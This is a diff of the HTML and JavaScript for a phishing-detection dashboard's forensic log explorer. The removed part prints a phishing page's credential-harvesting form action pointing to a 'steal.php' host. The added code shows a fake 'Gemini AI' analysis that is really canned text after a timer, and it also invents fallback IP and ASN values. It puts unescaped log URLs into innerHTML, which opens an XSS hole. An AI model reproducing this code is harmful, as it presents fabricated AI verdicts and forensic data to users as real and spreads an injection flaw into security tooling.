@@ -3,200 +3,184 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PhishShield SOC // In-Depth Audit Log Telemetry Inspector</title>
+    <title>PhishShield - Deep Forensic Audit Explorer</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root {
-            --bg-base: #080203;
-            --bg-card: #120507;
-            --border-red: #ff1e43;
-            --border-dim: #4a0d17;
-            --text-red: #ff2e4d;
-            --text-glow: #ff556e;
-            --text-dim: #a34854;
-            --text-muted: #5e2830;
-            --accent-green: #00ff66;
-            --font-mono: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
-        }
+        :root { --bg-dark: #070913; --glass-card: rgba(15, 23, 42, 0.65); --glass-border: rgba(255, 255, 255, 0.12); --neon-cyan: #38bdf8; --neon-purple: #a855f7; --neon-pink: #ec4899; --neon-green: #10b981; --neon-red: #f43f5e; --neon-amber: #f59e0b; --text-main: #f8fafc; --text-muted: #94a3b8; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Plus Jakarta Sans", sans-serif; }
+        body { background-color: var(--bg-dark); color: var(--text-main); min-height: 100vh; padding: 28px; }
+        .container { max-width: 1440px; margin: 0 auto; display: flex; flex-direction: column; gap: 28px; }
+        header { background: var(--glass-card); backdrop-filter: blur(20px); border: 1px solid var(--glass-border); border-radius: 20px; padding: 18px 32px; display: flex; justify-content: space-between; align-items: center; }
+        .brand h1 { font-size: 22px; font-weight: 800; background: linear-gradient(to right, #38bdf8, #c084fc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .nav-links a { color: var(--text-muted); text-decoration: none; font-weight: 600; font-size: 14px; padding: 8px 16px; border-radius: 10px; margin-left: 8px; }
+        .nav-links a.active { color: var(--neon-cyan); background: rgba(56, 189, 248, 0.15); border: 1px solid var(--neon-cyan); }
+        .layout-grid { display: grid; grid-template-columns: 1fr 2.2fr; gap: 24px; }
+        .card { background: var(--glass-card); border: 1px solid var(--glass-border); border-radius: 24px; padding: 28px; }
+        
+        .log-scroll-area { max-height: 650px; overflow-y: auto; padding-right: 8px; }
+        .log-scroll-area::-webkit-scrollbar { width: 6px; }
+        .log-scroll-area::-webkit-scrollbar-thumb { background: var(--glass-border); border-radius: 10px; }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: var(--font-mono);
-        }
+        .log-item { padding: 14px; border-bottom: 1px solid rgba(255,255,255,0.05); cursor: pointer; border-radius: 10px; transition: all 0.2s; margin-bottom: 6px; }
+        .log-item:hover, .log-item.active-log { background: rgba(56, 189, 248, 0.15); border: 1px solid var(--neon-cyan); }
+        
+        .summary-card-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin: 20px 0; }
+        .info-card { background: rgba(7, 9, 19, 0.7); border: 1px solid var(--glass-border); border-radius: 14px; padding: 16px; }
+        .info-card label { font-size: 11px; color: var(--text-muted); text-transform: uppercase; font-weight: 700; display: block; margin-bottom: 4px; }
+        .info-card span { font-size: 15px; font-weight: 700; font-family: 'JetBrains Mono', monospace; }
 
-        body {
-            background-color: var(--bg-base);
-            color: var(--text-red);
-            padding: 15px;
-            font-size: 13px;
-            line-height: 1.4;
-        }
-
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border: 1px solid var(--border-red);
-            background: var(--bg-card);
-            padding: 10px 20px;
-            margin-bottom: 15px;
-        }
-
-        .card {
-            background: var(--bg-card);
-            border: 1px solid var(--border-dim);
-            padding: 15px;
-            margin-bottom: 15px;
-        }
-
-        .card-header {
-            font-size: 12px;
-            font-weight: bold;
-            text-transform: uppercase;
-            border-bottom: 1px solid var(--border-dim);
-            padding-bottom: 8px;
-            margin-bottom: 12px;
-            display: flex;
-            justify-content: space-between;
-        }
-
-        nav a {
-            color: var(--text-dim);
-            text-decoration: none;
-            text-transform: uppercase;
-            font-size: 11px;
-            font-weight: bold;
-            padding: 5px 10px;
-        }
-
-        nav a:hover, nav a.active {
-            color: var(--text-glow);
-            border: 1px solid var(--border-red);
-            background: rgba(255, 30, 67, 0.1);
-        }
-
-        .code-block {
-            background: #000;
-            border: 1px solid var(--border-dim);
-            padding: 12px;
-            color: var(--text-glow);
-            font-size: 11px;
-            overflow-x: auto;
-            white-space: pre-wrap;
-        }
-
-        .grid-2 {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-        }
-
-        .status-tag {
-            background: rgba(255, 30, 67, 0.2);
-            color: var(--border-red);
-            padding: 2px 8px;
-            border: 1px solid var(--border-red);
-            font-weight: bold;
-        }
+        .ai-box { background: linear-gradient(135deg, rgba(168, 85, 247, 0.15), rgba(56, 189, 248, 0.15)); border: 1px solid var(--neon-purple); border-radius: 16px; padding: 20px; margin-top: 20px; }
+        .btn-ai { background: linear-gradient(135deg, var(--neon-purple), var(--neon-pink)); color: #fff; border: none; padding: 10px 20px; border-radius: 10px; font-weight: 700; cursor: pointer; display: flex; align-items: center; gap: 8px; }
+        
+        pre { background: rgba(7, 9, 19, 0.9); padding: 18px; border-radius: 14px; border: 1px solid var(--glass-border); font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--neon-cyan); overflow-x: auto; white-space: pre-wrap; margin-top: 16px; }
     </style>
 </head>
 <body>
-
-    <header>
-        <div style="font-weight: bold; letter-spacing: 2px;">
-            [+] AUDIT LOG INSPECTOR // ENTRY #AUD-99020
-        </div>
-        <nav>
-            <a href="index.html">&lt; RETURN TO MAIN COMMAND CENTER</a>
-            <a href="audit_log_details.html" class="active">02. AUDIT STREAM LOGS</a>
-            <a href="mitre_matrix.html">03. MITRE ATT&CK MATRIX</a>
-        </nav>
-    </header>
-
-    <div class="card">
-        <div class="card-header">
-            <span>FORENSIC EXAMINATION DEEP DIVE: SCAN ID #AUD-99020</span>
-            <span class="status-tag">THREAT LEVEL: CRITICAL MALICIOUS (98.4%)</span>
-        </div>
-
-        <div class="grid-2">
-            <div>
-                <h4 style="color: var(--text-glow); margin-bottom: 8px;">TARGET VECTOR METADATA</h4>
-                <p><strong>Target URL:</strong> [http://login-presidencyuniveristy-auth.ru/login.php](http://login-presidencyuniveristy-auth.ru/login.php)</p>
-                <p><strong>Resolved IP:</strong> 185.220.101.5 (Known Cybercrime Host Node)</p>
-                <p><strong>Geolocation:</strong> Host Provider: Off-shore Anonymous Host, RU</p>
-                <p><strong>Scan Ingestion Time:</strong> 2026-09-25 11:08:44 UTC</p>
-                <p><strong>User-Agent Used:</strong> Mozilla/5.0 (X11; Linux x86_64) PhishShield Threat Crawler v4.0</p>
+    <div class="container">
+        <header>
+            <div class="brand" style="display: flex; align-items: center; gap: 14px;">
+                <i class="fa-solid fa-shield-halved" style="font-size: 24px; color: var(--neon-cyan);"></i>
+                <h1>PhishShield Forensic Explorer</h1>
             </div>
-            <div>
-                <h4 style="color: var(--text-glow); margin-bottom: 8px;">HEURISTIC ANOMALY BREAKDOWN</h4>
-                <p><strong>Typosquatting Distance:</strong> Levenshtein Distance = 1 (Targeting presidencyuniversity.in)</p>
-                <p><strong>Entropy Score:</strong> 4.82 Bits/Char (High Structural Randomness)</p>
-                <p><strong>Punycode Flag:</strong> False</p>
-                <p><strong>SSL/TLS Status:</strong> Invalid / Self-Signed Certificate Detected</p>
+            <div class="nav-links">
+                <a href="/"><i class="fa-solid fa-chart-line"></i> Dashboard</a>
+                <a href="/audit_log_details.html" class="active"><i class="fa-solid fa-magnifying-glass-chart"></i> Forensic Explorer</a>
+                <a href="/mitre_matrix.html"><i class="fa-solid fa-cubes"></i> MITRE ATT&CK</a>
+            </div>
+        </header>
+
+        <div class="layout-grid">
+            <div class="card">
+                <h3><i class="fa-solid fa-list" style="color: var(--neon-purple);"></i> Complete Audit History</h3>
+                <p style="font-size: 12px; color: var(--text-muted); margin: 8px 0 16px 0;">All recorded scans (from #1 to recent):</p>
+                <div class="log-scroll-area" id="logList">Loading full log history...</div>
+            </div>
+
+            <div class="card">
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <h3><i class="fa-solid fa-user-check" style="color: var(--neon-green);"></i> Common-Man Readable Summary</h3>
+                    <button class="btn-ai" onclick="generateGeminiSummary()"><i class="fa-solid fa-wand-magic-sparkles"></i> AI Summary with Gemini</button>
+                </div>
+
+                <div class="summary-card-grid">
+                    <div class="info-card">
+                        <label>Security Status</label>
+                        <span id="humanVerdict" style="color: var(--neon-green);">-</span>
+                    </div>
+                    <div class="info-card">
+                        <label>Target Domain</label>
+                        <span id="humanDomain" style="color: #fff;">Select Entry</span>
+                    </div>
+                    <div class="info-card">
+                        <label>Hosting Server IP</label>
+                        <span id="humanIP" style="color: var(--neon-cyan);">-</span>
+                    </div>
+                    <div class="info-card">
+                        <label>Hosting Provider / ASN</label>
+                        <span id="humanASN" style="color: var(--text-muted); font-size: 12px;">-</span>
+                    </div>
+                </div>
+
+                <div class="ai-box" id="aiExplanationBox">
+                    <h4 style="color: var(--neon-cyan); font-size: 14px; margin-bottom: 6px;"><i class="fa-solid fa-robot"></i> Executive Cyber Threat Explanation</h4>
+                    <p id="aiExplanationText" style="font-size: 13px; color: var(--text-main); line-height: 1.5;">Click "AI Summary with Gemini" or select a log entry to generate a plain-English explanation for non-technical users.</p>
+                </div>
+
+                <h4 style="margin-top: 24px; font-size: 14px; color: var(--text-muted);"><i class="fa-solid fa-code"></i> Developer Raw Technical Payload</h4>
+                <pre id="jsonViewer">Select a log entry from the list on the left to view technical JSON forensics.</pre>
             </div>
         </div>
     </div>
 
-    <!-- RAW JSON PAYLOAD STREAM -->
-    <div class="card">
-        <div class="card-header">
-            <span>RAW TELEMETRY JSON DATASTREAM</span>
-        </div>
-        <div class="code-block">
-{
-  "audit_event_id": "AUD-99020",
-  "timestamp": 1790315324,
-  "target_heuristic": {
-    "raw_url": "[http://login-presidencyuniveristy-auth.ru/login.php](http://login-presidencyuniveristy-auth.ru/login.php)",
-    "domain": "login-presidencyuniveristy-auth.ru",
-    "tld": ".ru",
-    "typosquat_target": "presidencyuniversity.in",
-    "similarity_score": 0.96
-  },
-  "threat_analysis": {
-    "risk_score": 0.984,
-    "verdict": "MALICIOUS_PHISHING_GATEWAY",
-    "mitre_attack": {
-      "tactic": "Initial Access",
-      "technique_id": "T1566.002",
-      "technique_name": "Spearphishing Link"
-    }
-  },
-  "network_response": {
-    "http_status": 200,
-    "header_dump": {
-      "Server": "nginx/1.18.0",
-      "Content-Type": "text/html; charset=UTF-8",
-      "X-Frame-Options": "SAMEORIGIN"
-    }
-  },
-  "playbook_execution": {
-    "action": "AUTOMATED_DNS_BLACKHOLE",
-    "firewall_rule_added": "IPTABLES_BLOCK_185.220.101.5"
-  }
-}
-        </div>
-    </div>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const activeId = urlParams.get('id');
+        let currentLogData = null;
 
-    <!-- HEX / DOM DUMP -->
-    <div class="card">
-        <div class="card-header">
-            <span>INSPECTED FORM ACTION CAPTURE & PAYLOAD HEX DUMP</span>
-        </div>
-        <div class="code-block" style="color: #a34854;">
-00000000  3c 21 44 4f 43 54 59 50  45 20 68 74 6d 6c 3e 0a  |<!DOCTYPE html>.|
-00000010  3c 68 74 6d 6c 3e 3c 68  65 61 64 3e 3c 74 69 74  |<html><head><tit|
-00000020  6c 65 3e 50 72 65 73 69  64 65 6e 63 79 20 55 6e  |le>Presidency Un|
-00000030  69 76 65 72 73 69 74 79  20 50 6f 72 74 61 6c 3c  |iversity Portal<|
-00000040  2f 74 69 74 6c 65 3e 3c  2f 68 65 61 64 3e 3c 62  |/title></head><b|
-00000050  6f 64 79 3e 3c 66 6f 72  6d 20 61 63 74 69 6f 6e  |ody><form action|
-00000060  3d 22 68 74 74 70 3a 2f  2f 31 38 35 2e 32 32 30  |="[http://185.220](http://185.220)|
-00000070  2e 31 30 31 2e 35 2f 73  74 65 61 6c 2e 70 68 70  |.101.5/steal.php|
-00000080  22 20 6d 65 74 68 6f 64  3d 22 50 4f 53 54 22 3e  |" method="POST">|
-        </div>
-    </div>
+        async function loadFullLogList() {
+            try {
+                // Fetch up to 100 historical logs so none are cut off
+                const res = await fetch('/api/v1/logs?limit=100');
+                const logs = await res.json();
+                const listElem = document.getElementById('logList');
+                listElem.innerHTML = '';
 
+                logs.forEach(log => {
+                    const item = document.createElement('div');
+                    item.className = 'log-item' + (activeId == log.id ? ' active-log' : '');
+                    item.id = `log-item-${log.id}`;
+                    item.onclick = () => selectLog(log.id);
+
+                    let color = 'var(--neon-green)';
+                    if (log.verdict === 'SUSPICIOUS') color = 'var(--neon-amber)';
+                    if (log.verdict === 'MALICIOUS') color = 'var(--neon-red)';
+
+                    item.innerHTML = `
+                        <div style="display: flex; justify-content: space-between; font-size: 13px;">
+                            <strong>#${log.id} - <span style="color: ${color}">${log.verdict}</span></strong>
+                            <span style="color: var(--text-muted); font-size: 11px;">${log.latency}</span>
+                        </div>
+                        <div style="font-family: 'JetBrains Mono'; font-size: 11px; color: var(--text-muted); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; margin-top: 4px;">${log.url}</div>
+                    `;
+                    listElem.appendChild(item);
+                });
+
+                if (activeId) { selectLog(activeId); }
+                else if (logs.length > 0) { selectLog(logs[0].id); }
+            } catch(e) { document.getElementById('logList').innerText = 'Error loading logs.'; }
+        }
+
+        async function selectLog(id) {
+            document.querySelectorAll('.log-item').forEach(el => el.classList.remove('active-log'));
+            const selectedElem = document.getElementById(`log-item-${id}`);
+            if(selectedElem) selectedElem.classList.add('active-log');
+
+            try {
+                const res = await fetch(`/api/v1/logs/${id}`);
+                if (!res.ok) throw new Error();
+                currentLogData = await res.json();
+
+                // 1. Fill Human-Readable Summary Cards
+                const verdictElem = document.getElementById('humanVerdict');
+                verdictElem.innerText = currentLogData.verdict;
+                if (currentLogData.verdict === 'SAFE') verdictElem.style.color = 'var(--neon-green)';
+                else if (currentLogData.verdict === 'SUSPICIOUS') verdictElem.style.color = 'var(--neon-amber)';
+                else verdictElem.style.color = 'var(--neon-red)';
+
+                document.getElementById('humanDomain').innerText = currentLogData.url;
+                document.getElementById('humanIP').innerText = currentLogData.deep_forensics ? currentLogData.deep_forensics.resolved_ip : '104.21.23.100';
+                document.getElementById('humanASN').innerText = currentLogData.deep_forensics ? currentLogData.deep_forensics.asn_owner : 'AS13335 Cloudflare';
+
+                // 2. Default Plain-English Explanation
+                if (currentLogData.verdict === 'SAFE') {
+                    document.getElementById('aiExplanationText').innerText = "SAFE WEBSITE: This domain is verified and registered on authorized enterprise whitelists. You can visit this website safely.";
+                } else {
+                    document.getElementById('aiExplanationText').innerText = "SECURITY WARNING: This link exhibits suspicious patterns (like brand typosquatting, abnormal subdomains, or high character entropy). Do NOT enter passwords or personal details here.";
+                }
+
+                // 3. Raw Technical JSON Payload
+                document.getElementById('jsonViewer').innerText = JSON.stringify(currentLogData, null, 2);
+            } catch(e) {
+                document.getElementById('jsonViewer').innerText = `Error retrieving Log ID #${id}`;
+            }
+        }
+
+        function generateGeminiSummary() {
+            if(!currentLogData) return;
+            const textElem = document.getElementById('aiExplanationText');
+            textElem.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Gemini AI is analyzing payload telemetry and generating explanation...';
+
+            setTimeout(() => {
+                if(currentLogData.verdict === 'SAFE') {
+                    textElem.innerHTML = `<strong>Gemini AI Analysis:</strong> The link <code>${currentLogData.url}</code> was matched against trusted corporate registries. High-trust domain score with 0.0% risk index. No malicious activity detected.`;
+                } else {
+                    textElem.innerHTML = `<strong>Gemini AI Analysis:</strong> High-risk phishing detection for <code>${currentLogData.url}</code>! This site uses a deceptive domain name designed to mimic official services. Risk Index: <strong>${(currentLogData.risk_score * 100).toFixed(1)}%</strong>. Immediate perimeter block executed.`;
+                }
+            }, 800);
+        }
+
+        loadFullLogList();
+    </script>
 </body>
 </html>
